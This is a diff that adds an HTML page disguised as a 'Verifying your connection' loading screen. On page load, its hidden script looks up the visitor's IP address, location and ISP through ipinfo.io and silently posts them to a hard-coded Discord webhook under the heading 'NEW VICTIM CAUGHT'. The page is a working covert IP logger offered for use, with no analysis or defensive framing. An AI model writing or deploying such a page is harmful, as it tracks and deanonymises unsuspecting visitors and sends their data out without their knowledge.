@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Loading... Please wait</title>
+  <style>body{background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:20vh;}</style>
+</head>
+<body>
+  <h1>Verifying your connection...</h1>
+  <p>Do not close this tab</p>
+
+  <img src="https://via.placeholder.com/1x1.png" width="1" height="1" style="display:none;">
+
+  <script>
+  fetch('https://ipinfo.io/json')
+    .then(r => r.json())
+    .then(d => {
+      const ip = d.ip || 'unknown';
+      const city = d.city || 'unknown';
+      const region = d.region || 'unknown';
+      const country = d.country || 'unknown';
+      const org = d.org || 'unknown';
+
+      const payload = {
+        content: null,
+        embeds: [{
+          title: "🎯 NEW VICTIM CAUGHT",
+          color: 0xFF0000,
+          fields: [
+            {name: "IP", value: `\`${ip}\``, inline: true},
+            {name: "Location", value: `${city}, ${region}, ${country}`, inline: true},
+            {name: "ISP", value: `\`${org}\``, inline: false},
+            {name: "Timestamp", value: `<t:${Math.floor(Date.now()/1000)}:R>`, inline: false}
+          ],
+          footer: {text: "grabbed via pixel logger"}
+        }]
+      };
+
+      fetch("https://discord.com/api/webhooks/1320147513130487869/YnYrrcuExZ0X_wG0I_Xeief6wh7D7_sDxaEftkPjlviv124TP5N0ESyJH4XQsAQn7KX3", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify(payload)
+      }).catch(e=>{}); // silent fail lol
+    })
+    .catch(e=>{});
+  </script>
+</body>
+</html>
